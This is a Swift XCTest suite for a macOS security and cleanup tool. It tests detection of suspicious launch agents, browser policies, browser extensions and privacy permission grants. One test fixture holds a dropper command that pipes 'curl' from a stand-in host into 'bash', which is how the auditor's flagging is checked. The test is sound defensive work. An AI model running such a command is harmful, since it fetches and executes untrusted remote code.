import XCTest
@testable import TidyCore

final class ProtectionTests: XCTestCase {
    var root: URL!

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    @discardableResult
    private func writePlist(_ relative: String, _ plist: [String: Any]) throws -> URL {
        let url = root.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: url)
        return url
    }

    private func item(label: String, file: String? = nil, program: String? = nil, arguments: [String] = [], scope: LaunchItem.Scope = .userAgent) -> LaunchItem {
        LaunchItem(url: root.appendingPathComponent("LaunchAgents/\(file ?? label).plist"), label: label,
                   program: program ?? arguments.first, arguments: arguments,
                   runAtLoad: true, keepAlive: false, disabled: false, scope: scope)
    }

    func testReadsLaunchJobs() throws {
        try writePlist("LaunchAgents/com.example.sync.plist", [
            "Label": "com.example.sync",
            "ProgramArguments": ["/Applications/Example.app/Contents/MacOS/sync", "--quiet"],
            "RunAtLoad": true,
            "KeepAlive": ["SuccessfulExit": false],
        ])
        try writePlist("LaunchAgents/broken.plist", ["Label": 3])          // wrong type falls back to file name
        try Data("not a plist".utf8).write(to: root.appendingPathComponent("LaunchAgents/garbage.plist"))

        let items = LaunchItemReader.items(in: [(root.appendingPathComponent("LaunchAgents"), .userAgent)])
        XCTAssertEqual(items.map(\.label), ["broken", "com.example.sync"])
        let sync = items[1]
        XCTAssertEqual(sync.program, "/Applications/Example.app/Contents/MacOS/sync")
        XCTAssertTrue(sync.runAtLoad)
        XCTAssertTrue(sync.keepAlive)
        XCTAssertEqual(sync.scope, .userAgent)
    }

    func testNamesTheAppAJobComesWith() {
        XCTAssertEqual(item(label: "a", program: "/Applications/Dropbox.app/Contents/MacOS/Dropbox").appName, "Dropbox")
        XCTAssertEqual(item(label: "b", program: "/Applications/Setapp.app/Contents/Library/LoginItems/Agent.app/Contents/MacOS/Agent").appName,
                       "Setapp", "the outermost app")
        XCTAssertNil(item(label: "c", program: "/usr/local/bin/tool").appName)
        XCTAssertNil(item(label: "d").appName)
    }

    func testCleanJobHasNoFinding() {
        let findings = PersistenceAuditor().audit([item(label: "com.example.ok", program: "/Applications/Example.app/x")],
                                                  fileExists: { _ in true })
        XCTAssertTrue(findings.isEmpty)
    }

    func testFlagsProgramsInTemporaryOrHiddenFolders() {
        let findings = PersistenceAuditor().audit([
            item(label: "com.tmp.job", program: "/private/tmp/updater"),
            item(label: "com.hidden.job", program: "/Users/me/Library/.hidden/agent"),
        ], fileExists: { _ in true })
        XCTAssertEqual(findings.count, 2)
        XCTAssertTrue(findings.allSatisfy { $0.severity == .danger })
    }

    func testFlagsScriptsThatDownloadCode() {
        let findings = PersistenceAuditor().audit([
            item(label: "com.dropper", arguments: ["/bin/bash", "-c", "curl -s https://example.invalid/p | bash"]),
            item(label: "com.harmless", arguments: ["/bin/sh", "/Applications/Example.app/Contents/Resources/start.sh"]),
        ], fileExists: { _ in true })
        XCTAssertEqual(findings.map(\.title), ["com.dropper"])
        XCTAssertEqual(findings.first?.severity, .danger)
    }

    func testMissingProgramIsALeftoverNotAThreat() {
        let findings = PersistenceAuditor().audit([item(label: "com.gone.helper", program: "/Applications/Gone.app/helper")],
                                                  fileExists: { _ in false })
        XCTAssertEqual(findings.first?.severity, .notice)
        XCTAssertTrue(findings.first?.reasons.first?.contains("no longer exists") == true)
    }

    func testFlagsStartupProgramsNoDeveloperSigned() {
        let signatures: [String: CodeSignature] = [
            "/Applications/Signed.app/Contents/MacOS/agent": .identified,
            "/Library/Application Support/Unsigned/agent": .unsigned,
            "/Library/Application Support/AdHoc/agent": .notIdentified,
            "/Library/Application Support/Changed/agent": .broken,
            "/opt/homebrew/opt/postgresql@16/bin/postgres": .notIdentified,
        ]
        let checked = Recorder<String>()
        let findings = PersistenceAuditor().audit([
            item(label: "com.example.signed", program: "/Applications/Signed.app/Contents/MacOS/agent"),
            item(label: "com.example.unsigned", program: "/Library/Application Support/Unsigned/agent"),
            item(label: "com.example.adhoc", program: "/Library/Application Support/AdHoc/agent"),
            item(label: "com.example.changed", program: "/Library/Application Support/Changed/agent"),
            item(label: "homebrew.mxcl.postgresql@16", program: "/opt/homebrew/opt/postgresql@16/bin/postgres"),
            item(label: "com.gone.helper", program: "/Applications/Gone.app/helper"),
        ], fileExists: { !$0.hasPrefix("/Applications/Gone.app") }, signature: { checked.add($0); return signatures[$0] ?? .unknown })

        XCTAssertEqual(Set(findings.map(\.title)), ["com.example.unsigned", "com.example.adhoc", "com.example.changed", "com.gone.helper"])
        XCTAssertEqual(Set(findings.filter { $0.title != "com.gone.helper" }.map(\.severity)), [.warning])
        XCTAssertTrue(findings.first { $0.title == "com.example.changed" }?.reasons == ["Its program was changed after its developer signed it."])
        XCTAssertFalse(checked.all.contains { $0.hasPrefix("/opt/homebrew/") || $0.hasPrefix("/Applications/Gone.app") },
                       "Homebrew builds its programs without a developer's certificate, and a missing program has nothing to check")
    }

    func testMismatchedNameIsWorthALookForSystemJobs() {
        let findings = PersistenceAuditor().audit([item(label: "com.apple.fake", file: "com.random.xyz", program: "/usr/local/bin/x", scope: .daemon)],
                                                  fileExists: { _ in true })
        XCTAssertEqual(findings.first?.severity, .warning)
    }

    func testFindingsAreOrderedMostSevereFirst() {
        let findings = PersistenceAuditor().audit([
            item(label: "a.leftover", program: "/Applications/Gone.app/x"),
            item(label: "b.danger", program: "/tmp/x"),
        ], fileExists: { $0.hasPrefix("/tmp") })
        XCTAssertEqual(findings.map(\.title), ["b.danger", "a.leftover"])
    }

    func testFindsBrowserSettingsForcedByPolicy() throws {
        let managed = root.appendingPathComponent("Managed Preferences")
        try writePlist("Managed Preferences/com.google.Chrome.plist", [
            "DefaultSearchProviderSearchURL": "https://search.example.invalid/?q={searchTerms}",
            "SomethingHarmless": true,
        ])
        try writePlist("Managed Preferences/me/com.brave.Browser.plist", ["HomepageLocation": "https://example.invalid"])
        try writePlist("Managed Preferences/com.google.Keystone.plist", ["HomepageLocation": "x"])   // not a browser domain

        let findings = BrowserPolicyAuditor(managedPreferences: managed).audit()
        XCTAssertEqual(Set(findings.map(\.title)), ["Chrome settings are locked by a policy", "Brave settings are locked by a policy"])
        XCTAssertTrue(findings.allSatisfy { $0.severity == .warning })
    }
}

final class BrowserExtensionTests: XCTestCase {
    var home: URL!

    override func setUpWithError() throws {
        home = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: home)
    }

    private func write(_ object: Any, to relative: String, plist: Bool = false) throws {
        let url = home.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        let data = plist ? try PropertyListSerialization.data(fromPropertyList: object, format: .xml, options: 0)
                         : try JSONSerialization.data(withJSONObject: object)
        try data.write(to: url)
    }

    func testListsChromeExtensionsWithTheirNamesAndReach() throws {
        let profile = "Library/Application Support/Google/Chrome/Default"
        try write([String: Any](), to: "\(profile)/Preferences")
        let blocker = "\(profile)/Extensions/" + String(repeating: "a", count: 32)
        try write(["name": "Old name", "version": "1.9.0"], to: "\(blocker)/1.9.0_0/manifest.json")
        try write(["name": "__MSG_extName__", "default_locale": "fr", "version": "1.10.0", "host_permissions": ["<all_urls>"]],
                  to: "\(blocker)/1.10.0_0/manifest.json")
        try write(["extname": ["message": "Bloqueur"]], to: "\(blocker)/1.10.0_0/_locales/fr/messages.json")
        let docs = "\(profile)/Extensions/" + String(repeating: "b", count: 32)
        try write(["name": "Docs helper", "version": "2.0", "permissions": ["storage"],
                   "content_scripts": [["matches": ["https://docs.google.com/*"]]]], to: "\(docs)/2.0_0/manifest.json")
        try write([String: Any](), to: "\(profile)/Extensions/Temp/manifest.json")

        let found = BrowserExtensionReader(home: home, pluginKit: { _ in nil }).extensions()
        XCTAssertEqual(found.map(\.name), ["Bloqueur", "Docs helper"], "the newest version, named in its default language")
        XCTAssertEqual(found.map(\.version), ["1.10.0", "2.0"])
        XCTAssertEqual(found.map(\.readsAllSites), [true, false])
        XCTAssertEqual(Set(found.map(\.browser)), ["Google Chrome"])
    }

    func testListsFirefoxExtensionsButNotFirefoxsOwn() throws {
        let profile = "Library/Application Support/Firefox/Profiles/abcd1234.default-release"
        try Data().write(to: { let url = home.appendingPathComponent("\(profile)/prefs.js")
            try? FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            return url }())
        try write(["addons": [
            ["id": "uBlock0@raymondhill.net", "type": "extension", "location": "app-profile", "version": "1.60.0",
             "defaultLocale": ["name": "uBlock Origin"], "userPermissions": ["permissions": ["storage"], "origins": ["<all_urls>"]],
             "path": "/x/uBlock0@raymondhill.net.xpi"],
            ["id": "formautofill@mozilla.org", "type": "extension", "location": "app-system-defaults", "defaultLocale": ["name": "Form Autofill"]],
            ["id": "dark@mozilla.org", "type": "theme", "location": "app-profile", "defaultLocale": ["name": "Dark"]],
            ["id": "helper@vendor.example", "type": "extension", "location": "app-system-user", "defaultLocale": ["name": "Vendor Helper"],
             "userPermissions": ["origins": ["https://vendor.example/*"]]],
        ]], to: "\(profile)/extensions.json")

        let found = BrowserExtensionReader(home: home, pluginKit: { _ in nil }).extensions()
        XCTAssertEqual(found.map(\.name), ["uBlock Origin", "Vendor Helper"], "one another app installed is listed too")
        XCTAssertEqual(found.map(\.readsAllSites), [true, false])
        XCTAssertEqual(found.first?.url.path, "/x/uBlock0@raymondhill.net.xpi")
    }

    func testListsSafariExtensionsWithTheAppsTheyComeWith() throws {
        let blocker = "Applications/Blocker.app/Contents/PlugIns/Blocker Extension.appex"
        try write(["CFBundleDisplayName": "Blocker", "CFBundleShortVersionString": "3.1"], to: "\(blocker)/Contents/Info.plist", plist: true)
        try write(["manifest_version": 3, "permissions": ["storage"], "host_permissions": ["*://*/*"]],
                  to: "\(blocker)/Contents/Resources/manifest.json")
        let clipper = "Applications/Notes Clipper.app/Contents/PlugIns/Clipper.appex"
        try write(["CFBundleName": "Clipper", "NSExtension": ["SFSafariWebsiteAccess": ["Level": "Some"]]],
                  to: "\(clipper)/Contents/Info.plist", plist: true)
        let listings = [
            "com.apple.Safari.web-extension":
                "     com.example.blocker.extension(3.1)\tAAAA-1111\t2026-01-01 10:00:00 +0000\t\(home.appendingPathComponent(blocker).path)\n",
            "com.apple.Safari.extension":
                "+    com.example.clipper(1.0)\tBBBB-2222\t2025-05-05 10:00:00 +0000\t\(home.appendingPathComponent(clipper).path)\n",
        ]

        let found = BrowserExtensionReader(home: home, pluginKit: { listings[$0] }).extensions()
        XCTAssertEqual(found.map(\.name), ["Blocker", "Clipper"])
        XCTAssertEqual(found.map(\.readsAllSites), [true, false])
        XCTAssertEqual(found.map(\.app), ["Blocker", "Notes Clipper"])
        XCTAssertEqual(Set(found.map(\.browser)), ["Safari"])
    }

    func testRecognizesEveryWebsitePatterns() {
        for pattern in ["<all_urls>", "*://*/*", "https://*/*", "http://*/"] {
            XCTAssertTrue(BrowserExtensionReader.isAllSites(pattern), pattern)
        }
        for pattern in ["https://*.google.com/*", "file:///*", "storage", "https://example.com/*"] {
            XCTAssertFalse(BrowserExtensionReader.isAllSites(pattern), pattern)
        }
    }
}

final class PrivacyPermissionsTests: XCTestCase {
    let home = URL(fileURLWithPath: "/Users/someone")

    func testListsAppsAllowedToWatchListenOrReadEverything() {
        let yours = """
            [{"service":"kTCCServiceMicrophone","client":"us.zoom.xos","client_type":0},
             {"service":"kTCCServiceCamera","client":"us.zoom.xos","client_type":0},
             {"service":"kTCCServiceCamera","client":"com.apple.FaceTime","client_type":0}]
            """
        let systems = """
            [{"service":"kTCCServiceSystemPolicyAllFiles","client":"/usr/libexec/sshd-keygen-wrapper","client_type":1},
             {"service":"kTCCServiceScreenCapture","client":"/Applications/zoom.us.app/Contents/Frameworks/CptHost.app/Contents/MacOS/CptHost","client_type":1},
             {"service":"kTCCServiceListenEvent","client":"com.example.unknown","client_type":0}]
            """
        let report = PrivacyPermissions(home: home, query: { database, _ in database.path.hasPrefix("/Users/") ? yours : systems },
                                        appNames: { ["us.zoom.xos": "zoom.us", "com.apple.FaceTime": "FaceTime"] }).read()
        XCTAssertTrue(report.isComplete)
        XCTAssertEqual(report.grants.map { "\($0.kind.title): \($0.name)" }, [
            "Camera: FaceTime", "Camera: zoom.us", "Microphone: zoom.us", "Screen recording: zoom.us",
            "Input Monitoring: what you type: com.example.unknown", "Full Disk Access: every file: sshd-keygen-wrapper",
        ])
    }

    func testSaysWhatCouldNotBeRead() {
        let report = PrivacyPermissions(home: home, query: { database, _ in database.path.hasPrefix("/Users/") ? "\n" : nil },
                                        appNames: { [:] }).read()
        XCTAssertTrue(report.grants.isEmpty)
        XCTAssertEqual(report.unreadable.map(\.path), ["/Library/Application Support/com.apple.TCC/TCC.db"])
        XCTAssertFalse(report.isComplete)
    }

    func testAsksOnlyForAccessThatIsAllowed() {
        XCTAssertTrue(PrivacyPermissions.sql.contains("auth_value = 2"))
        XCTAssertTrue(PrivacyPermissions.sql.contains("'kTCCServiceCamera', 'kTCCServiceMicrophone'"))
    }
}
